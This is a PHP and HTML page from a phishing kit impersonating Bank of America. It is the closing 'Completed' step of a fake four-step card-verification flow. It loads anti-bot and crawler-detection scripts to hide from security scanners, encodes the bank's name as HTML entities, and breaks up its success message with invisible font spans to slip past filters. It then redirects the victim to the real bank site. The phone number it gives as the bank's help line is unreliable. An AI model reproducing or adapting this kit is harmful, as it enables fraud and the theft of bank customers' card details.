<?php
    session_start();

    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
    include './zsec.php';
    include 'bot_fucker/wrd.php';
     include 'bot_fucker/bot.php';
	 include 'crawlerdetect.php';
    include 'huehuehue.php';
	session_destroy();
?>
<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" class="gr__secure"><head class="at-element-marker" style="visibility:visible;">

<title>&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;&#32;&#81;&#117;&#101;&#115;&#116;&#105;&#111;&#110;</title>
<html><meta http-equiv="Refresh" content="03; url=https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=signonv2"></html>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  <link rel="stylesheet" type="text/css" href="css/style2.css" />
<link rel="stylesheet" type="text/css" href="css/zk.css" />
<link rel="stylesheet" type="text/css" href="css/abpa-foundation.css" />
<link rel="stylesheet" type="text/css" href="css/abpa-responsive.css" />

<body data-gr-c-s-loaded="true" class="safari safari537 breeze"><div id="mboxDiv" class="mbox-name-bac_dep_consumer_app_personal_info_1_top at-element-marker" style="visibility:visible;">
</div><script type="text/javascript"></script>
<div id="fX2J_" style="width:100%;height:100%;" class="z-page">
	<div id="fX2J1" class="z-div">
		<div id="fX2J2" style="display:none;" class="z-div"><span id="fX2J3" class="z-label">Build: </span></div>
		<a id="fX2J4" name="top"></a>
		<div id="fX2J5" class="row page-container">
	
	<div id="fX2J6" class="small-12 columns">
		<div id="fX2J7" class="z-div">
	<div id="fX2J8" class="header">
		<div id="fX2J9" class="row header_branding-bar">
			<div class="small-12 columns">
			
			 <span>
                 <img role="img" tabindex="0" class="image-logo" src="images/new_logo.svg" alt="Bank of America">
             </span>
				<a class="right secure-text show-for-medium-up" href="javascript:void(0);" onclick="displayPopup('JavaScript:Void(0);');return false;" name="ancHMSecArea" id="ancHMSecArea">Secure Page</a>
				<a class="right secure-text show-for-small-only" href="javascript:void(0);" onclick="displayPopup('JavaScript:Void(0);');return false;" name="ancHMSecArea" id="ancHMSecArea"></a>
			</div>
		</div>
		<div id="fX2Ja" class="row header_title-bar">
			<div class="small-12 columns">
				<h1>
					<span class="show-for-large-up">Verify Your Card Information<sup>™</sup> </span>
					<span focusable="true" focusableintouchmode="true" class="show-for-medium-down">Verify Your Card Information</span>
				</h1>
			</div>
		</div>	
		<div id="fX2Jb" class="z-include">
	<div id="fX2Jc" class="row">
		<div class="small-12 columns progress-bar--v1">
			<div class="contain-to-grid sticky">
			    <nav class="top-bar" data-topbar="">
 					<div class="progress progress--v1">
						<span id="step-meter" class="meter" style="width: 100%;"><span id="step-meter-inner" class="meter" style="display:none;"></span></span>
						<span id="step-counter" class="hide">3</span>
					</div>
					<ul class="progress-bar_step-list--v1">
						<li class="progress-bar_step">
							<span id="step-1-circle" class="step-circle done">
								<p class="show-for-medium-up step-number">
									<span id="fX2Je" class="ada-hidden">Step 1 of 4 (Current Step):</span>
								1</p>
							</span>					
							<label id="step-1-label" class="show-for-medium-up step-text">Security Question</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-2-circle" class="step-circle done">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jh" class="ada-hidden">Step 2 of 4:</span>
								2</p>
							</span>
														<label id="step-2-label" class="show-for-medium-up step-text">Your Information</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-3-circle" class="step-circle done">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jk" class="ada-hidden">Step 3 of 4 (Current Step):</span>
								3</p>
							</span>
							<label id="step-3-label" class="show-for-medium-up step-text ">Card Information</label>
						</li>
						<li class="progress-bar_step">
							<span id="step-4-circle" class="step-circle active">
								<p class="show-for-medium-up step-number">
									<span id="fX2Jn" class="ada-hidden">Step 4 of 4:</span>
								4</p>
							</span>
							<label id="step-4-label" class="show-for-medium-up step-text active">Completed</label>
						</li>
					</ul>
					<a id="help-link" class="show-for-small-only help-dropdown_trigger">Need Help?</a>
                </nav>
				<ul role="list" aria-label="Need Help Menu" id="help-menu">
					<span>
							<li class="help-menu_cell">
								<a class="help-menu_link" href="tel:844-375-7031">
									<img class="image-call"  src="images/call_icon_2x.svg">
									Call 844-375-7031
								</a>
							</li>
					</span>
					
					<li class="help-menu_cell" id="tc-chat-container-59"></li>
				</ul>
			</div>
		</div>
	</div></div></div></div>
		<div id="fX2Jp" class="z-include">
<div id="fX2Jq" class="z-div">
	<div id="fX2Jr" class="row show-for-medium-up contact-container">
		<div id="cdpContactDiv" class="medium-6 columns right">
			<ul class="inline-list contact-list">
				<li class="show-for-medium-up">
					<img class="image-call" src="images/call_icon_2x.svg" alt=" ">
					<span class="contact-list_item-title">CALL</span>
					<span class="contact-list_item-body">844-375-7031</span>
				</li>
				<li class="show-for-medium-up" id="tc-chat-container-48" aria-live="polite"><img src="images/app-fixed1-busy.png" alt="Chat with us - chat is busy." style="cursor:default"></li>
			</ul>
		</div>
	</div></div></div>
		
		
		
		<div id="fX2Jw" class="z-include">
	<div id="fX2Jx" style="display:none;" class="z-div">

		<div id="fX2J20" class="row ada-hidden">
			<div class="small-12 columns">
				<ul>
					<div id="fX2J30" class="z-div"></div>
				</ul>
			</div>
		</div></div></div>
		<div id="fX2J50" class="z-div">
	<div id="fX2J60" class="row"></div>
	<div id="fX2J70" class="row">
	<div id="fX2J80" class="z-div">
</div>
	<div id="fX2Jk0" class="z-div">
		<div id="fX2Jl0" class="small-12 columns ">
			<div id="fX2Jm0" style="width:100%;height:100%;" class="responsive-div-include z-include">
	<div id="fX2Jn0" class="z-div">

		<div id="fX2Jo0" class="row">
			<div class="small-12 medium-11 columns">
				<div id="fX2Jp0" class="z-div">
		
					<h3 id="fX2Jr0" class="c1">Your acco<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>unt has been Successfully upda<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>ted, and you’ll be redi<font style="color:transparent;font-size:0px"> <?php $RUNDOMSIT ?></font>rected in 5 seconds.  </h3></div>
					<img src="images/success.gif" alt="" width="256" height="256" align="center">
			</div>
		</div>

		<div id="fX2Js1" class="z-include">
	<div id="fX2Jt1" class="row hide-for-print">
		<span id="hiddenIsContinueButtonActive_v_1" style="display:none;" class="z-checkbox"><input type="checkbox" id="hiddenIsContinueButtonActive_v_1-real" name="hiddenIsContinueButtonActive" checked="checked"><label for="hiddenIsContinueButtonActive_v_1-real" class="z-checkbox-cnt"></label></span>
		
	</div></div>
		<div id="fX2J22" class="z-div">
	<div id="fX2J32" class="footer hide-for-print">
		<div id="fX2J42" class="row">
			<div id="fX2J52" class="small-12 columns">
				<p class="privacy-text">
					<span id="fX2J62" class="z-span">
					<a id="fX2J72" class="privacy-text_link" title="Share website feedback" name="link_shareWebsiteFeedback" href="javascript:void(0);" onclick="oo_feedback.show()">Share website feedback</a>
					<span id="fX2J82" aria-hidden="true"> | </span></span>


					
					<a class="privacy-text_link" title="Privacy & Security. Link opens in new window." name="PrivacyAndSecurity" href="javascript:void(0);" onclick="displayPopup('javascript:void(0);');return false;">&#80;&#114;&#105;&#118;&#97;&#99;&#121; &amp; &#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a>
				</p>
				<p focusable="true" focusableintouchmode="true" class="copyright-text">
					&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#44;&#32;&#78;&#46;&#65;&#46;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;
					
					<a class="copyright-text_link" title="Equal Housing Lender. Link opens in new window." href="javascript:void(0);" onclick="displayPopup('javascript:void(0);');return false;" name="EqualHousingLender">Equal Housing Lender</a>
				</p>
				<p focusable="true" focusableintouchmode="true" class="copyright-text">&copy; 2022&#32;&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#67;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#105;&#111;&#110;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#44;&#32;&#78;&#46;&#65;&#46;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;</p>
			</div></div></div></div>
	</div></div>
		<div id="fX2Jb2" class="z-div"></div>

		<div id="fX2Je2" class="block-ui">
			<div id="fX2Jf2" class="processing-modal z-window-modal z-window-modal-shadow">
				<div class="z-window-modal-tl-noborder">
					<div class="z-window-modal-tr-noborder"></div>
				</div>
			
				<div class="z-window-modal-bl-noborder">
					<div class="z-window-modal-br-noborder"></div>
				</div>
			</div></div></div></div>

</body></html>